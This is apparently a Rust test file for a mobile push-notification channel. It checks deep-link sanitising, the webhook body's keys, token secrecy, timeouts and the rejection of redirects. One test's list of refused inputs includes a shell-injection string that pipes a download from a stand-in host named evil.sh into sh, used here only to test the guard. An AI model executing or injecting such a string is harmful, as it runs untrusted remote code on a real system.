use super::{DEFAULT_MOSHI_URL, HttpPost, MoshiChannel, herdr_link, moshi_secret, webhook_body};
use crate::channels::{Delivery, Event};
use crate::routing::ReportMode;
use std::cell::RefCell;

struct RecordingHttp {
    /// What the endpoint answers. Scripted, the way hermes's recorded post
    /// already carries its outcome: a push that was refused is reachable
    /// no other way, and it is the direction a doctor exists to find.
    answers: bool,
    posts: RefCell<Vec<(String, String)>>,
}

impl RecordingHttp {
    fn answering(answers: bool) -> Self {
        RecordingHttp {
            answers,
            posts: RefCell::new(Vec::new()),
        }
    }
}

impl HttpPost for RecordingHttp {
    fn post_json(&self, url: &str, body: &str) -> bool {
        self.posts
            .borrow_mut()
            .push((url.to_string(), body.to_string()));
        self.answers
    }
}

/// The channel as the composition root builds it: the secret already
/// extracted from the `[plugins.mobile]` settings, no file anywhere near it.
fn channel_with_settings(settings: &str) -> MoshiChannel<RecordingHttp> {
    MoshiChannel {
        http: RecordingHttp::answering(true),
        token: moshi_secret(&settings.parse().unwrap()),
        url: "https://example.invalid/hook".to_string(),
    }
}

fn event() -> Event {
    Event {
        title: "claude done: dotfiles".to_string(),
        preview: "a preview".to_string(),
        message: "the full message, longer than the preview".to_string(),
        // A REAL herdr pane id, colon and all, because the card's deep
        // link is built from exactly this field.
        pane: "wW:p21".to_string(),
        ..Event::default()
    }
}

// --- the deep link ------------------------------------------------------

#[test]
fn a_safe_pane_becomes_a_pane_precise_herdr_link() {
    // The whole feature: the sanitized origin pane, spelled into moshi's
    // scheme with no workspace, no tab and no session, because the
    // dispatch site holds a pane and nothing else. Every parameter is
    // optional, so a pane-only link is a link.
    assert_eq!(
        herdr_link("wW:p21"),
        Some("moshi://herdr?pane=wW:p21".to_string())
    );
}

#[test]
fn a_pane_the_safety_guard_refuses_gets_no_link_rather_than_an_escaped_one() {
    // A MALFORMED ACTION DELETES THE CARD, it does not degrade it: moshi
    // answers a bad body non-2xx and the whole delivery turns Failed. So
    // anything outside the guard's charset produces no action at all,
    // which is the plain card this feature decorates.
    for refused in [
        "",
        "wW:p21 evil",
        "a&workspace=x",
        "a#b",
        "a/b",
        "a?b",
        "a=b",
        "a%b",
        "a+b",
        "panée",
        "x; curl evil.sh | sh",
    ] {
        assert_eq!(herdr_link(refused), None, "case: {refused:?}");
    }
}

#[test]
fn the_link_needs_no_escaping_because_the_guard_already_bounded_its_charset() {
    // The guard's whole alphabet at once. Every one of these characters is
    // legal unencoded in a query value (unreserved, plus the colon that
    // `pchar` admits), which is WHY the link can be a format string rather
    // than a percent-encoder nobody would test.
    let link = herdr_link("aZ9.-_:").expect("the guard's own charset is safe");
    assert_eq!(link, "moshi://herdr?pane=aZ9.-_:");
}

// --- the body -----------------------------------------------------------

#[test]
fn the_body_carries_token_title_and_the_preview_as_the_message() {
    // THE KEY COUNT IS A GUARD, not a formality: nothing rides along with
    // the secret that was not put there deliberately. It is now asked of
    // BOTH arms, because the link arm is exactly the edit that could
    // smuggle a fourth key in unnoticed.
    for (link, keys) in [(None, 3), (Some("moshi://herdr?pane=wW:p21"), 4)] {
        let body = webhook_body("tok-1", "a title", "a preview", link);
        let parsed: serde_json::Value = serde_json::from_str(&body).unwrap();
        assert_eq!(parsed["token"], "tok-1");
        assert_eq!(parsed["title"], "a title");
        assert_eq!(parsed["message"], "a preview");
        assert_eq!(
            parsed.as_object().unwrap().len(),
            keys,
            "nothing else rides along with the secret; link: {link:?}"
        );
    }
}

#[test]
fn a_link_rides_as_the_one_url_action_and_no_link_leaves_the_slot_absent() {
    // ONE `data` object holding ONE `type` is what makes url and image
    // mutually exclusive here: a structural limit of the field, not a rule
    // moshi documents.
    let linked = webhook_body("tok-1", "t", "p", Some("moshi://herdr?pane=wW:p21"));
    let parsed: serde_json::Value = serde_json::from_str(&linked).unwrap();
    assert_eq!(parsed["data"]["type"], "url");
    assert_eq!(parsed["data"]["url"], "moshi://herdr?pane=wW:p21");
    assert_eq!(
        parsed["data"].as_object().unwrap().len(),
        2,
        "one type and one url, never a second action beside them"
    );

    let plain = webhook_body("tok-1", "t", "p", None);
    let parsed: serde_json::Value = serde_json::from_str(&plain).unwrap();
    assert!(
        parsed.get("data").is_none(),
        "no pane means no action key at all, not an empty one: {plain}"
    );
}

// --- delivery -----------------------------------------------------------

#[test]
fn a_missing_token_posts_nothing_and_fails_by_naming_the_config_key_to_write() {
    // BOTH WAYS a channel arrives without a token: a settings table that
    // provided none, and a composition root that read none at all.
    for channel in [
        channel_with_settings("other = \"x\"\n"),
        MoshiChannel {
            http: RecordingHttp::answering(true),
            token: None,
            url: DEFAULT_MOSHI_URL.to_string(),
        },
    ] {
        assert_eq!(
            channel.deliver(&event(), ReportMode::Silent),
            Delivery::Failed(
                "push SKIPPED -- no moshi token in the config ([plugins.mobile] token); \
                     nothing was sent"
                    .to_string()
            )
        );
        assert!(channel.http.posts.borrow().is_empty());
    }
}

#[test]
fn a_push_the_endpoint_took_is_delivered_and_one_it_did_not_is_failed_without_the_token() {
    // THE SENTENCE IS THE WHOLE ASSERTION on the failing side: the only
    // thing worth reporting about this channel used to be the request that
    // carries the token, so a verdict that named one would be the leak the
    // silence was protecting.
    for (answered, verdict) in [
        (true, Delivery::Delivered("pushed the card".to_string())),
        (
            false,
            Delivery::Failed(
                "push FAILED (the moshi endpoint refused it or could not be reached)".to_string(),
            ),
        ),
    ] {
        let channel = MoshiChannel {
            http: RecordingHttp::answering(answered),
            token: Some("tok-secret-9".to_string()),
            url: "https://example.invalid/hook".to_string(),
        };
        assert_eq!(
            channel.deliver(&event(), ReportMode::Silent),
            verdict,
            "answered: {answered}"
        );
    }
}

#[test]
fn a_token_posts_once_to_the_url_with_the_preview_never_the_message() {
    let channel = channel_with_settings("token = \"tok-1\"\n");
    channel.deliver(&event(), ReportMode::Silent);
    let posts = channel.http.posts.borrow();
    assert_eq!(posts.len(), 1);
    assert_eq!(
        posts[0].0, "https://example.invalid/hook",
        "the configured url is the one posted to, never the constant"
    );
    assert!(posts[0].1.contains("a preview"));
    assert!(
        !posts[0].1.contains("longer than the preview"),
        "the phone gets the ceiling-safe preview"
    );
}

#[test]
fn the_posted_card_links_to_the_origin_pane_and_a_paneless_one_ships_plain() {
    // THE WIRING, end to end through the public seam: the event's own pane
    // is what the card links to, and an event that carries none posts the
    // card it posts today. A channel that built the link from anything
    // else, or dropped it, differs right here.
    //
    // THE THIRD ROW IS THE GUARD ITSELF, AT THIS SEAM. Without it a
    // dispatch site that stopped calling `herdr_link` and asked only
    // "is the pane non-empty" passes every test in this module: the two
    // rows above agree with that weaker rule, and `herdr_link` keeps its
    // own tests green while nothing calls it. So a pane that is present
    // and UNSAFE is asked here too, because this is where an unescaped
    // value would actually reach moshi's parser and turn the decoration
    // into a non-2xx that DELETES the card.
    for (pane, action) in [
        ("wW:p21", Some("moshi://herdr?pane=wW:p21")),
        ("", None),
        ("wW:p21 evil&workspace=x", None),
    ] {
        let channel = channel_with_settings("token = \"tok-1\"\n");
        channel.deliver(
            &Event {
                pane: pane.to_string(),
                ..event()
            },
            ReportMode::Silent,
        );
        let posts = channel.http.posts.borrow();
        let parsed: serde_json::Value = serde_json::from_str(&posts[0].1).unwrap();
        assert_eq!(
            parsed.get("data").map(|data| data["url"].clone()),
            action.map(serde_json::Value::from),
            "pane: {pane:?}"
        );
    }
}

// --- the production post, against real sockets ---------------------------

use super::UreqPost;
use std::time::Duration;

#[test]
fn the_deadline_fires_instead_of_parking_the_notification_path() {
    // A bound socket that never accepts: the connection black-holes, and
    // the deadline is what keeps the hermes and banner legs from queuing
    // behind a dead network for minutes.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}/hook", listener.local_addr().unwrap());
    let post = UreqPost {
        timeout: Duration::from_millis(100),
    };
    let started = std::time::Instant::now();
    assert!(!post.post_json(&url, "{}"), "a dead endpoint is a false");
    assert!(
        started.elapsed() < Duration::from_secs(3),
        "the deadline fired, not the OS timeout"
    );
}

#[test]
fn a_closed_port_is_a_quiet_false_never_a_report() {
    // The only thing worth reporting would be the request that carries
    // the token, so failure returns false and says nothing. The stderr
    // half is held by the integration gate, which runs this same path
    // against a closed port and asserts empty output.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}/hook", listener.local_addr().unwrap());
    drop(listener);
    assert!(!UreqPost::default().post_json(&url, "{}"));
}

#[test]
fn a_redirect_is_not_a_delivery_however_the_endpoint_dresses_it_up() {
    // `max_redirects(0)` hands a 3xx back as an Ok RESPONSE rather than an
    // error, so a bare `is_ok` read one as a card that landed: the check
    // printed Delivered for a phone that was never pushed to. THE 200 IS
    // THE OTHER HALF, over a real socket, so the answer cannot become a
    // blanket false and pass this by refusing everything.
    use super::super::post_fixture::{DEADLINE, serve};
    for (status, delivered) in [("302 Found", false), ("200 OK", true)] {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let url = format!("http://{}/hook", listener.local_addr().unwrap());
        let response = format!(
            "HTTP/1.1 {status}\r\nLocation: http://127.0.0.1:1/\r\nContent-Length: 0\r\n\r\n"
        );
        let result = std::thread::scope(|scope| {
            let server = scope.spawn(|| serve(listener, &response, b"{}"));
            let result = UreqPost { timeout: DEADLINE }.post_json(&url, "{}");
            server.join().unwrap().expect("the request must arrive");
            result
        });
        assert_eq!(result, delivered, "the endpoint answered {status}");
    }
}

#[test]
fn a_redirecting_endpoint_is_never_followed() {
    // The bash curl carried no -L: a compromised endpoint must not turn
    // the channel into a blind request against a target it names. The
    // decoy listener proves no second request happens.
    use super::super::post_fixture::{DEADLINE, serve};
    let decoy = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let decoy_addr = decoy.local_addr().unwrap();
    decoy.set_nonblocking(true).unwrap();
    let redirector = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}/hook", redirector.local_addr().unwrap());
    let response = format!(
        "HTTP/1.1 302 Found\r\nLocation: http://{decoy_addr}/\r\nContent-Length: 0\r\n\r\n"
    );
    std::thread::scope(|scope| {
        let server = scope.spawn(|| serve(redirector, &response, b"{}"));
        UreqPost { timeout: DEADLINE }.post_json(&url, "{}");
        server.join().unwrap().expect("the request must arrive");
    });
    assert!(
        decoy.accept().is_err(),
        "the redirect target must never be contacted"
    );
}
